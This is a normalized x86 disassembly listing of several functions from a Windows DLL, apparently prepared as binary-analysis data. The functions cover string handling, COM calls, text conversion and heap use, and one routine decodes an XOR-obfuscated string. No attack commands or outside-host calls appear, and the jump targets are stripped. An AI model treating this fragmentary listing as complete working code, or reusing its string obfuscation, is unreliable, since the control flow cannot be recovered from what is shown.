call sub_10059c40
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_1002d84e
cmp [ ebp - 0x191 ] 0x1
jne r-xdata
cmp eax 0x12e
jne r-xdata
lea eax [ edi + 0x38 ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_10064570
push 0x1
push r--data
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x1bc ] eax
mov [ ebp - 0x8c ] 0xf
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0xa0 ] bl
call sub_10037e00
mov [ ebp - 0x4 ] 0x7
push 0x1
lea ecx [ ebp - 0xa0 ]
cmp [ esi ] ebx
jne r-xdata
push r--data
call sub_1002d84e
cmp [ ebp - 0xa8 ] 0x10
jb r-xdata
push r--data
push r--data
jmp r-xdata
xor eax eax
mov edx [ ebp - 0xbc ]
push edx
call sub_100187af
add esp 0x4
lea eax [ edi + 0x54 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_100629b0
push eax
push esi
lea edi [ ebp - 0xa0 ]
call sub_10059c40
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_1002d84e
call sub_1002e070
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
ja r-xdata
mov ecx [ ebp - 0x198 ]
lea eax [ esi + 0x54 ]
push eax
push ecx
lea eax [ ebp - 0x190 ]
call sub_10064570
push 0x1
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x1b0 ] eax
call sub_1003e830
push eax
lea edx [ ebp - 0x148 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x8
call sub_10057800
add esp 0x10
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x38 ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp ecx 0x4
ja r-xdata
mov eax [ ebp - 0x4c ]
push eax
call sub_100187af
add esp 0x4
lea eax [ esi + 0x70 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_100629b0
mov edx [ ebp - 0x198 ]
push eax
push edx
lea edi [ ebp - 0x148 ]
call sub_10059c40
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x198 ]
lea eax [ esi + 0x70 ]
push eax
push ecx
lea eax [ ebp - 0x190 ]
call sub_10064570
push 0x227a9
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x1c4 ] eax
call sub_1003e830
push eax
lea edx [ ebp - 0x164 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0xb
call sub_10057800
add esp 0x10
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp ecx 0x5
ja r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_100187af
add esp 0x4
lea eax [ esi + 0x8c ]
push eax
lea eax [ ebp - 0x190 ]
call sub_100629b0
mov esi [ ebp - 0x198 ]
push eax
push esi
lea edi [ ebp - 0x164 ]
call sub_10059c40
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ edi + 0x8c ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_10064570
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0xe0 ] 0xf
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xf4 ] bl
mov [ ebp - 0x4 ] 0xe
cmp [ ebp - 0x74 ] ebx
je r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x1a0 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x11
call sub_1000be00
mov edi eax
mov [ ebp - 0x4 ] 0x12
mov esi [ ebp - 0x18c ]
mov ecx [ ebp - 0x190 ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
lea ecx [ ebp - 0x84 ]
push ecx
lea edx [ ebp - 0x30 ]
push r--data
push edx
call sub_100403d0
add esp 0xc
push eax
lea ecx [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0xf
call sub_10021bf0
mov [ ebp - 0x4 ] 0xe
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
push 0xffffffff
push ebx
push edi
call sub_1005e580
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x6
ja r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_100187af
add esp 0x4
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100187af
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_100629b0
push eax
push esi
lea edi [ ebp - 0xf4 ]
call sub_10059c40
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
push r--data
call sub_1002d84e
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_100187af
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_10064570
mov [ ebp - 0x1c0 ] eax
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x19c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0x12c ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x13
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x14
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x1c
push esi
call sub_1005e580
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1002d84e
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x1bc ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x16
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x17
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x18
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x38
push esi
call sub_1005e580
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1002d84e
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x1b0 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x19
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1a
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x1b
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x54
push esi
call sub_1005e580
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1002d84e
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x1c4 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0x148 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1c
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1d
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x1e
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x70
push esi
call sub_1005e580
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1002d84e
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x1b8 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0x164 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1f
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x20
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x21
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x8c
push esi
call sub_1005e580
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1002d84e
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_100187af
add esp 0x4
cmp [ ebp - 0x74 ] ebx
je r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0x68 ]
push ecx
lea edi [ ebp - 0x190 ]
call sub_10044960
push eax
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x25
call sub_10021bf0
mov esi 0x10
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov ecx [ ebp - 0x1c0 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xf4 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x22
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x23
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x24
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
cmp [ ebp - 0xa8 ] esi
jb r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0xa8
push esi
call sub_1005e580
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1002d84e
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x19c ] ecx
mov eax [ ebp - 0xbc ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100187af
add esp 0x4
mov edi 0xf
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xf4 ] bl
cmp [ ebp - 0x150 ] esi
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_100187af
add esp 0x4
mov edx [ ebp - 0xac ]
mov [ ebp - 0x1a0 ] edx
cmp [ ebp - 0xe0 ] esi
jb r-xdata
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0x150 ] edi
mov [ ebp - 0x154 ] ebx
mov [ ebp - 0x164 ] bl
cmp [ ebp - 0x134 ] esi
jb r-xdata
mov ecx [ ebp - 0x164 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0x134 ] edi
mov [ ebp - 0x138 ] ebx
mov [ ebp - 0x148 ] bl
cmp [ ebp - 0x8c ] esi
jb r-xdata
mov edx [ ebp - 0x148 ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0xa0 ] bl
cmp [ ebp - 0xfc ] esi
jb r-xdata
mov eax [ ebp - 0xa0 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0xfc ] edi
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] bl
cmp [ ebp - 0x118 ] esi
jb r-xdata
mov ecx [ ebp - 0x110 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x12c ] bl
cmp [ ebp - 0xc4 ] esi
jb r-xdata
mov edx [ ebp - 0x12c ]
push edx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x190 ]
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xd8 ] bl
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xd8 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x18c ] ebx
mov [ ebp - 0x188 ] ebx
cmp [ ebp - 0x16c ] esi
jb r-xdata
mov ecx [ ebp - 0x1ac ]
push ecx
mov ecx [ ebp - 0x18c ]
lea edx [ ebp - 0x184 ]
push edx
push ecx
push eax
call sub_10028f80
mov edx [ ebp - 0x190 ]
push edx
call sub_100187af
add esp 0x14
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x16c ] edi
mov [ ebp - 0x170 ] ebx
mov [ ebp - 0x180 ] bl
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov eax [ ebp - 0x180 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x84 ] bl
mov ecx [ ebp - 0x84 ]
push ecx
call sub_100187af
add esp 0x4
sub_1002ad30
push ebp
mov ebp esp
sub esp 0xbc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor ebx ebx
push esi
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb0 ] ebx
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x5a
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0x12
jb r-xdata
xor eax eax
lea edx [ ebp - 0xb0 ]
push edx
mov [ ebp - 0x18 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x3c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
cmp [ edi + 0x118 ] 0x8
lea eax [ edi + 0x104 ]
jb r-xdata
mov ecx 0x3
lea edx [ ebp - 0x58 ]
mov eax 0xfd
mov [ ebp - 0x14 ] cx
lea esi [ ecx - 0x2 ]
call sub_10053240
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
lea eax [ ebp - 0xb0 ]
push eax
push r--data
lea eax [ ebp - 0x58 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x8 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] esi
call ecx
test eax eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov eax [ ebp - 0xb0 ]
mov edx [ eax ]
push esi
push eax
mov eax [ edx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x1e
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb4 ] ebx
call sub_10053240
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xb8 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ eax ]
xor ebx ebx
lea edx [ ebp - 0xac ]
mov eax 0x9f
call sub_10053240
mov esi 0x1
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xb8 ]
mov ecx [ eax ]
lea edx [ ebp - 0xb4 ]
push edx
mov edx [ ebp - 0xb0 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0xb4 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0xe9
call sub_10053240
mov [ ebp - 0xbc ] 0x2
jmp r-xdata
mov eax [ ebp - 0xb0 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xb8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xb4 ] ebx
push esi
call [ SysFreeString@IAT ]
mov esi [ ebp - 0xbc ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_1002af00
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
mov eax [ esi + 0x4 ]
push edi
mov edi [ ebp + 0x10 ]
jne r-xdata
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx [ eax ]
jne r-xdata
push edi
mov edi [ ebp + 0x8 ]
push eax
push 0x1
push edi
call sub_10006840
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp ebx eax
jne r-xdata
mov ecx [ edi + 0xc ]
cmp ecx [ ebx + 0xc ]
jae r-xdata
mov eax [ edi + 0xc ]
cmp eax [ ebx + 0xc ]
jae r-xdata
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jae r-xdata
push 0x0
push edi
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
call sub_1002c7e0
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
pop ebx
pop edi
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
push edi
mov edi [ ebp + 0x8 ]
push ebx
push 0x1
push edi
mov ecx esi
call sub_10006840
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ edi + 0xc ]
cmp [ ebx + 0xc ] eax
jae r-xdata
lea ecx [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
call sub_10012040
mov eax [ ebp + 0x10 ]
mov ecx [ edi + 0xc ]
cmp [ eax + 0xc ] ecx
jae r-xdata
push edi
mov edi [ ebp + 0x8 ]
push eax
push 0x0
push edi
call sub_10006840
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
lea ecx [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
call sub_1004e420
mov eax [ ebp + 0x10 ]
cmp eax [ esi + 0x4 ]
je r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov ecx esi
je r-xdata
mov edx [ ebx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov ecx esi
je r-xdata
mov ecx [ edi + 0xc ]
cmp ecx [ eax + 0xc ]
jae r-xdata
push ebx
push 0x1
push edi
call sub_10006840
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push eax
push 0x0
push edi
call sub_10006840
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push eax
push 0x1
push edi
call sub_10006840
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push ebx
push 0x0
push edi
call sub_10006840
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_1002b060
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] ecx
call sub_100164d0
mov eax [ ebp - 0x20 ]
mov esi 0x8
cmp [ ebp - 0xc ] esi
jae r-xdata
mov edx [ ebp - 0x10 ]
push 0x0
push 0x0
push 0x0
push 0x0
push edx
push eax
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov edi eax
test edi edi
jne r-xdata
lea eax [ ebp - 0x20 ]
push ebx
mov ebx [ GetProcessHeap@IAT ]
lea ecx [ edi + 0x1 ]
push ecx
push esi
call ebx
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp - 0xc ] esi
jb r-xdata
cmp [ ebp - 0xc ] 0x8
mov eax [ ebp - 0x20 ]
jae r-xdata
cmp [ ebp - 0xc ] 0x8
jb r-xdata
pop edi
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x20 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x10 ]
push 0x0
push 0x0
push edi
push esi
push ecx
push eax
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
push esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
pop ebx
pop edi
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x20 ]
push edx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax edi
call sub_100017c0
mov ecx [ ebp - 0x28 ]
mov edx [ ecx ]
add esp 0xc
push edx
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
inc ecx
push ecx
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp - 0x28 ]
mov [ edx ] eax
test eax eax
jne r-xdata
push eax
call ebx
push eax
call [ HeapFree@IAT ]
cmp [ ebp - 0xc ] 0x8
jb r-xdata
mov ecx [ ebp - 0x24 ]
push esi
push ecx
push eax
mov eax edi
call sub_100017c0
add esp 0xc
push esi
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
lea ecx [ ebp - 0x20 ]
call sub_10019100
mov ecx [ ebp - 0x4 ]
pop ebx
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x20 ]
call sub_10019100
pop ebx
pop edi
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x20 ]
push edx
call sub_100187af
add esp 0x4
sub_1002b202
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1002b230
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push ebx
push esi
lea esi [ ecx - 0x1 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push edi
xor ebx ebx
